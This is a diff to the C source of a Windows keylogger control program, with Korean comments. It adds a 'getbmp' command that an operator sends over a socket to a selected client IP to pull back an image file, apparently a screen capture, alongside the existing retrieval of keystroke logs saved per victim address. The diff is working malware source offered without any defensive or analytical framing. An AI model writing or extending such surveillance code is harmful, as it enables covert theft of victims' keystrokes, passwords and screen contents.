@@ -10,6 +10,7 @@
 #define MYPORT 8000
 #define FILE_BUF 1024
 BOOL isSend = FALSE;
+BOOL isBmp = FALSE;
 HWND hWndMain;
 WSADATA wsaData;
 HANDLE pThread;
@@ -69,6 +70,29 @@ BOOL CALLBACK MainDlgProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam
 	case WM_COMMAND ://각종 버튼에대한 명령 처리
 
 		switch (LOWORD(wParam)) {
+
+		case IDC_BMPRECV :
+
+			index = SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETCURSEL, 0, 0);
+			SendDlgItemMessage(hWnd, IDC_LIST1, LB_GETTEXT, index, (LPARAM)buf);
+
+			if (isSend == TRUE) {
+				MessageBox(hWnd, TEXT("이미 파일을수신중입니다"), TEXT("알림"), MB_OK);
+			}
+			else if (_tcslen(buf) <= 0)//수정
+			{
+				MessageBox(hWnd, TEXT("아이피를 선택하세요"), TEXT("알림"), MB_OK);
+				return FALSE;
+			}
+			else {
+				wsprintf(Listbuf, TEXT("%s 아이피로부터 BMP 파일를 수신중입니다.."), buf);
+				SendDlgItemMessage(hWnd, IDC_LIST2, LB_ADDSTRING, 0, (LPARAM)Listbuf);
+				SendCommand("getbmp", index);
+				memset(buf, 0, BUF_SIZE);
+			}
+			return TRUE;
+
+
 
 		case IDC_RECV :
 
@@ -282,7 +306,14 @@ unsigned int WINAPI ConnectKeyLog(void* data)//키로거 연결 함수
 						break;
 					}
 					//키로거로부터 파일받기
-					wsprintf(FileName, TEXT("%s.txt"), Client[sigEventIdx].Addr);
+					if (isBmp) {//bmp파일일경우 이름변경
+						wsprintf(FileName, TEXT("%s.cab"), Client[sigEventIdx].Addr);
+						isBmp = FALSE;
+					}
+					else {
+						wsprintf(FileName, TEXT("%s.txt"), Client[sigEventIdx].Addr);
+					}
+
 					hFile = CreateFile(FileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 					while (1)
 					{
@@ -359,6 +390,13 @@ void CloseConnect()//연결종료
 void SendCommand(char* com,int idx)//명령전송함수
 {
 
+		if (strncmp(com, "getbmp", 6) == 0)
+		{
+			isSend = TRUE;
+			isBmp = TRUE;
+			send(Client[idx].Socket, "getbmp", 6, 0);
+
+		}
 		if (strncmp(com, "get", 3) == 0)
 		{
 			isSend = TRUE;
